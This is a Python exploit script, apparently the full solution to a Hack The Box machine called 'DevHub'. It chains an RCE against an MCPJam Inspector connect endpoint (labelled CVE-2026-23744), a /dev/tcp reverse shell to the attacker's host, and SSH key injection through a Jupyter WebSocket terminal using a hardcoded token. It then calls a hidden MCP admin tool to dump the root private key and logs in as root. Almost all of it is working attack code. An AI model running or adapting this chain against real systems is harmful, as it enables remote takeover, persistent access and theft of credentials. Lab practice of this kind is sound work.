#!/usr/bin/env python3
"""
Usage: python3 devhub_pwn.py <target_ip> <your_ip>
"""

import sys
import socket
import struct
import base64
import time
import urllib.request
import json
import subprocess
import os

TARGET = sys.argv[1] if len(sys.argv) > 1 else "10.129.9.19"
LHOST  = sys.argv[2] if len(sys.argv) > 2 else "10.10.14.73"
LPORT  = 4444

JUPYTER_TOKEN = "a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
OPSMCP_KEY    = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"

# ─────────────────────────────────────────────
# STEP 1: Generate SSH keypair
# ─────────────────────────────────────────────
def generate_ssh_key():
    print("[*] Step 1: Generating SSH keypair...")
    key_path = "/tmp/devhub_analyst"
    if os.path.exists(key_path):
        os.remove(key_path)
    if os.path.exists(key_path + ".pub"):
        os.remove(key_path + ".pub")
    subprocess.run(
        ["ssh-keygen", "-t", "ed25519", "-f", key_path, "-N", ""],
        capture_output=True
    )
    with open(key_path + ".pub") as f:
        pubkey = f.read().strip()
    print(f"[+] SSH key generated: {key_path}")
    print(f"[+] Public key: {pubkey}")
    return key_path, pubkey

# ─────────────────────────────────────────────
# STEP 2: CVE-2026-23744 - RCE via MCPJam Inspector
# ─────────────────────────────────────────────
def trigger_rce(command):
    print(f"\n[*] Step 2: Triggering CVE-2026-23744 RCE...")
    print(f"[*] Command: {command}")
    url = f"http://{TARGET}:6274/api/mcp/connect"
    payload = json.dumps({
        "serverConfig": {
            "command": "bash",
            "args": ["-c", command],
            "env": {}
        },
        "serverId": "exploit"
    }).encode()
    req = urllib.request.Request(
        url,
        data=payload,
        headers={"Content-Type": "application/json"},
        method="POST"
    )
    try:
        urllib.request.urlopen(req, timeout=5)
    except Exception as e:
        # Expected - reverse shell breaks the connection
        print(f"[+] RCE triggered (connection error expected): {e}")

# ─────────────────────────────────────────────
# STEP 3: WebSocket frame builder
# ─────────────────────────────────────────────
def make_ws_frame(msg):
    data = msg.encode()
    length = len(data)
    if length <= 125:
        header = bytes([0x81, 0x80 | length])
    elif length <= 65535:
        header = bytes([0x81, 0xFE]) + struct.pack(">H", length)
    else:
        header = bytes([0x81, 0xFF]) + struct.pack(">Q", length)
    mask = b'\x00\x00\x00\x00'
    return header + mask + data

# ─────────────────────────────────────────────
# STEP 4: Inject SSH key via Jupyter WebSocket terminal
# ─────────────────────────────────────────────
def inject_ssh_key_via_jupyter(pubkey, target_internal="127.0.0.1"):
    """
    This runs on the target machine as mcp-dev.
    Since we have a shell, we run this via the RCE.
    We create the script on target and execute it.
    """
    print(f"\n[*] Step 4: Injecting SSH key via Jupyter WebSocket...")

    script = f"""
import socket, struct, base64, time

TOKEN = "{JUPYTER_TOKEN}"

def make_frame(msg):
    data = msg.encode()
    length = len(data)
    if length <= 125:
        header = bytes([0x81, 0x80 | length])
    elif length <= 65535:
        import struct
        header = bytes([0x81, 0xFE]) + struct.pack(">H", length)
    else:
        import struct
        header = bytes([0x81, 0xFF]) + struct.pack(">Q", length)
    return header + b'\\x00\\x00\\x00\\x00' + data

# Create terminal session
import urllib.request, json
req = urllib.request.Request(
    "http://127.0.0.1:8888/api/terminals",
    data=b"{{}}",
    headers={{"Authorization": f"token {{TOKEN}}", "Content-Type": "application/json"}},
    method="POST"
)
urllib.request.urlopen(req)

# WebSocket connect
key = base64.b64encode(b"1234567890123456").decode()
handshake = (
    f"GET /terminals/websocket/1?token={{TOKEN}} HTTP/1.1\\r\\n"
    f"Host: 127.0.0.1:8888\\r\\n"
    f"Upgrade: websocket\\r\\n"
    f"Connection: Upgrade\\r\\n"
    f"Sec-WebSocket-Key: {{key}}\\r\\n"
    f"Sec-WebSocket-Version: 13\\r\\n\\r\\n"
)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 8888))
s.send(handshake.encode())
time.sleep(1)
resp = s.recv(4096)

# Send command
cmd = '["stdin", "mkdir -p /home/analyst/.ssh && echo {pubkey} >> /home/analyst/.ssh/authorized_keys && chmod 700 /home/analyst/.ssh && chmod 600 /home/analyst/.ssh/authorized_keys\\\\n"]'
s.send(make_frame(cmd))
time.sleep(3)
s.recv(4096)
s.close()
print("SSH key injected")
"""
    # Write script to target via RCE
    escaped = script.replace("'", "'\\''")
    write_cmd = f"echo '{escaped}' > /tmp/inject.py && python3 /tmp/inject.py"
    trigger_rce(write_cmd)
    print("[+] SSH key injection triggered")

# ─────────────────────────────────────────────
# STEP 5: Dump root SSH key via OPSMCP hidden tool
# ─────────────────────────────────────────────
def dump_root_key_via_opsmcp():
    """Run this after SSHing in as analyst"""
    print(f"\n[*] Step 5: Calling hidden OPSMCP tool to dump root SSH key...")
    # This must be called from analyst session (internal localhost:5000)
    # Shown here as the curl equivalent
    print("[*] Run this command as analyst:")
    print(f"""
curl -s -X POST http://127.0.0.1:5000/tools/call \\
  -H "X-API-Key: {OPSMCP_KEY}" \\
  -H "Content-Type: application/json" \\
  -d '{{"name":"ops._admin_dump","arguments":{{"target":"ssh_keys","confirm":true}}}}'
""")

# ─────────────────────────────────────────────
# STEP 6: Save root key and SSH
# ─────────────────────────────────────────────
def save_root_key_and_ssh(key_data):
    print("\n[*] Step 6: Saving root key...")
    key_path = "/tmp/devhub_root"
    with open(key_path, "w") as f:
        f.write(key_data)
    os.chmod(key_path, 0o600)
    print(f"[+] Root key saved to {key_path}")
    print(f"[+] SSH in with: ssh -i {key_path} root@{TARGET}")
    print("\n[*] Connecting as root...")
    subprocess.run(["ssh", "-i", key_path,
                    "-o", "StrictHostKeyChecking=no",
                    f"root@{TARGET}"])

# ─────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────
def main():
    print("=" * 60)
    print("  DevHub HTB - Full Exploitation Chain")
    print("  CVE-2026-23744 + Jupyter WS + OPSMCP")
    print("=" * 60)

    # Step 1
    key_path, pubkey = generate_ssh_key()

    # Step 2 - Get shell via CVE-2026-23744
    print(f"\n[*] Step 2: Starting netcat listener on port {LPORT}...")
    print(f"[!] Run in another terminal: nc -lvnp {LPORT}")
    print(f"[*] Then press Enter to trigger the reverse shell...")
    input()
    reverse_shell = f"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"
    trigger_rce(reverse_shell)

    # Step 3+4 - Inject SSH key (run on target manually or via shell)
    print(f"\n[*] Step 3+4: In your mcp-dev shell, run:")
    print(f"""
cat > /tmp/inject.py << 'PYEOF'
import socket, struct, base64, time, urllib.request, json

TOKEN = "{JUPYTER_TOKEN}"

def make_frame(msg):
    data = msg.encode()
    length = len(data)
    if length <= 125:
        header = bytes([0x81, 0x80 | length])
    elif length <= 65535:
        header = bytes([0x81, 0xFE]) + struct.pack(">H", length)
    else:
        header = bytes([0x81, 0xFF]) + struct.pack(">Q", length)
    return header + b'\\x00\\x00\\x00\\x00' + data

urllib.request.urlopen(urllib.request.Request(
    "http://127.0.0.1:8888/api/terminals",
    data=b"{{}}", 
    headers={{"Authorization": f"token {{TOKEN}}", "Content-Type": "application/json"}},
    method="POST"
))

key = base64.b64encode(b"1234567890123456").decode()
handshake = (f"GET /terminals/websocket/1?token={{TOKEN}} HTTP/1.1\\r\\nHost: 127.0.0.1:8888\\r\\n"
             f"Upgrade: websocket\\r\\nConnection: Upgrade\\r\\nSec-WebSocket-Key: {{key}}\\r\\n"
             f"Sec-WebSocket-Version: 13\\r\\n\\r\\n")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 8888))
s.send(handshake.encode())
time.sleep(1)
s.recv(4096)
cmd = '["stdin", "mkdir -p /home/analyst/.ssh && echo {pubkey} >> /home/analyst/.ssh/authorized_keys && chmod 700 /home/analyst/.ssh && chmod 600 /home/analyst/.ssh/authorized_keys\\\\n"]'
s.send(make_frame(cmd))
time.sleep(3)
s.recv(4096)
s.close()
print("Done")
PYEOF
python3 /tmp/inject.py
""")

    input("\n[*] Press Enter once SSH key is injected...")

    # SSH as analyst
    print(f"\n[+] SSHing as analyst...")
    print(f"    ssh -i {key_path} analyst@{TARGET}")
    print(f"\n[*] Once logged in as analyst, run:")
    dump_root_key_via_opsmcp()

    print("""
[*] Save the root_private_key value to /tmp/devhub_root
    Then: chmod 600 /tmp/devhub_root
          ssh -i /tmp/devhub_root root@""" + TARGET)

    print("\n[+] Full chain complete!")
    print("    user.txt: ~/user.txt (as analyst)")
    print("    root.txt: /root/root.txt (as root)")

if __name__ == "__main__":
    main()
  
